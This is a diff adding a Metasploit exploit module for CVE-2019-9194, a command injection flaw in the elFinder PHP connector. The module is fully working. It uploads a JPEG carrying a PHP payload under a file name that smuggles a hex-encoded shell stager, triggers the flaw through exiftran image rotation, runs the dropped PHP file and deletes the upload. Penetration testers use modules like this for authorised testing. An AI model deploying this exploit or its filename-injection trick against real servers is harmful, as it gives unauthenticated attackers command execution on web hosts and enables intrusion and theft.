@@ -1,0 +1,263 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'elFinder PHP Connector exiftran Command Injection',
+      'Description'    => %q{
+        This module exploits a command injection vulnerability in elFinder
+        versions prior to 2.1.48.
+
+        The PHP connector component allows unauthenticated users to upload
+        files and perform file modification operations, such as resizing and
+        rotation of an image. The file name of uploaded files is not validated,
+        allowing shell metacharacters.
+
+        When performing image operations on JPEG files, the filename is passed
+        to the `exiftran` utility without appropriate sanitization, causing
+        shell commands in the file name to be executed, resulting in remote
+        command injection as the web server user.
+
+        The PHP connector is not enabled by default.
+
+        The system must have `exiftran` installed and in `$PATH`.
+
+        This module has been tested successfully on elFinder versions 2.1.47,
+        2.1.20 and 2.1.16 on Ubuntu.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Thomas Chauchefoin', # Discovery
+          'q3rv0',              # Exploit
+          'bcoles'              # Metasploit
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-9194'],
+          ['EDB', '46481'],
+          ['URL', 'https://github.com/Studio-42/elFinder/releases/tag/2.1.48'],
+          ['URL', 'https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/']
+        ],
+      'Arch'           => ARCH_PHP,
+      'Platform'       => 'php',
+      'Targets'        => [['Auto', {}]],
+      'Privileged'     => false,
+      'DisclosureDate' => '2019-02-26',
+      'DefaultTarget'  => 0))
+
+    register_options [
+      OptString.new('TARGETURI', [true, 'The base path to elFinder', '/elFinder/'])
+    ]
+  end
+
+  #
+  # Check if /php/connector.minimal.php exists and is executable
+  #
+  def check
+    uri = normalize_uri(target_uri.path, 'php', 'connector.minimal.php')
+    res = send_request_cgi('uri' => uri)
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    unless res.code == 200
+      vprint_status "#{uri} does not exist"
+      return CheckCode::Safe
+    end
+
+    if res.body.include? '<?php'
+      vprint_status 'PHP is not enabled'
+      return CheckCode::Safe
+    end
+
+    CheckCode::Detected
+  end
+
+  #
+  # Upload PHP payload
+  #
+  def upload(fname)
+    # Small JPEG file from:
+    # https://github.com/mathiasbynens/small/blob/master/jpeg.jpg
+    jpeg = %w[
+      FF D8 FF DB 00 43 00 03 02 02 02 02 02 03 02 02
+      02 03 03 03 03 04 06 04 04 04 04 04 08 06 06 05
+      06 09 08 0A 0A 09 08 09 09 0A 0C 0F 0C 0A 0B 0E
+      0B 09 09 0D 11 0D 0E 0F 10 10 11 10 0A 0C 12 13
+      12 10 13 0F 10 10 10 FF C9 00 0B 08 00 01 00 01
+      01 01 11 00 FF CC 00 06 00 10 10 05 FF DA 00 08
+      01 01 00 00 3F 00 D2 CF 20 FF D9
+    ]
+    jpeg = [jpeg.join].pack('H*')
+    jpeg << rand_text_alphanumeric(50..100)
+    jpeg << "<?php #{payload.encoded} ?>"
+    jpeg << rand_text_alphanumeric(50..100)
+
+    data = Rex::MIME::Message.new
+    data.add_part('upload', nil, nil, 'form-data; name="cmd"')
+    data.add_part('l1_Lw', nil, nil, 'form-data; name="target"')
+    data.add_part(jpeg, 'image/jpeg', nil, %(form-data; name="upload[]"; filename="#{fname}"))
+    post_data = data.to_s
+
+    print_status("Uploading payload '#{fname}' (#{post_data.length} bytes)")
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'php', 'connector.minimal.php'),
+      'ctype'  => "multipart/form-data; boundary=#{data.bound}",
+      'data'   => post_data
+    )
+
+    unless res
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    unless res.code == 200
+      fail_with Failure::UnexpectedReply, 'Unexpected reply'
+    end
+
+    unless res.body.include?('"added"')
+      fail_with Failure::UnexpectedReply, "Upload failed: #{res.body}"
+    end
+
+    if res.body.include?('"error"') || res.body.include?('"warning"')
+      fail_with Failure::UnexpectedReply, "Upload failed: #{res.body}"
+    end
+
+    json_res = JSON.parse(res.body) rescue nil
+
+    if json_res.nil? || json_res['added'].empty?
+      fail_with Failure::UnexpectedReply, "Upload failed: #{res.body}"
+    end
+
+    json_res['added'].first['hash'] || ''
+  end
+
+  #
+  # Trigger the command injection via image rotation functionality
+  # Rotates image by 180 degrees to trigger `exiftran` code path
+  #
+  def trigger(hash)
+    print_status 'Triggering vulnerability via image rotation ...'
+
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'php', 'connector.minimal.php'),
+      'vars_get' => {
+        'target' => hash,
+        'degree' => '180',
+        'mode'   => 'rotate',
+        'cmd'    => 'resize'
+      }
+    }, 5)
+
+    unless res
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    if res.body.include?('"error"') || res.body.include?('"warning"')
+      fail_with Failure::UnexpectedReply, "Image rotate failed: #{res.body}"
+    end
+  end
+
+  #
+  # Delete uploaded file
+  #
+  def delete_file(hash)
+    print_status 'Removing uploaded file ...'
+
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'php', 'connector.minimal.php'),
+      'vars_get' => {
+        'cmd' => 'rm',
+        'targets[]' => hash
+      }
+    }, 15)
+
+    unless res
+      print_status 'Connection failed'
+      return
+    end
+
+    if res.body.include?('errFileNotFound')
+      print_error "Could not delete uploaded file. Unexpected reply: #{res.body}"
+      return
+    end
+
+    print_good 'Deleted uploaded file'
+  end
+
+  #
+  # Execute payload
+  #
+  def execute_payload(php_fname)
+    path = normalize_uri(target_uri.path, 'php', php_fname)
+
+    print_status "Executing payload (#{path}) ..."
+
+    res = send_request_cgi({
+      'uri' => path
+    }, 15)
+
+    unless res
+      print_status 'No reply'
+      return
+    end
+
+    unless res.code == 200
+      fail_with Failure::UnexpectedReply, "Executing payload failed (HTTP #{res.code})"
+    end
+  end
+
+  #
+  # Remove uploaded file
+  #
+  def cleanup
+    delete_file @hash unless @hash.nil?
+  ensure
+    super
+  end
+
+  #
+  # upload && execute
+  #
+  def exploit
+    unless check == CheckCode::Detected
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    fname = rand_text_alphanumeric(6..10)
+    php_fname = ".#{rand_text_alphanumeric(6..10)}.php"
+
+    # Max file name length is ~250 characters
+    # and characters such as `/` are forbidden.
+    # Hex encoded stager copies the uploaded file from the `files` directory
+    # to the working directory (`php`) and changes the extension to `.php`
+    # The stager is decoded with xxd when the vuln is triggered.
+    stager = "cp ../files/#{fname}.jpg*echo* #{php_fname}"
+
+    # Upload our payload jpg file with encoded stager in the filename
+    jpg_fname = "#{fname}.jpg;echo #{stager.unpack('H*').flatten.first} |xxd -r -p |sh& #.jpg"
+    @hash = upload jpg_fname
+
+    if @hash.to_s == ''
+      fail_with Failure::Unknown, 'Upload failed: Failed to retrieve file hash ID'
+    end
+
+    trigger @hash
+
+    register_file_for_cleanup php_fname
+
+    execute_payload php_fname
+  end
+end
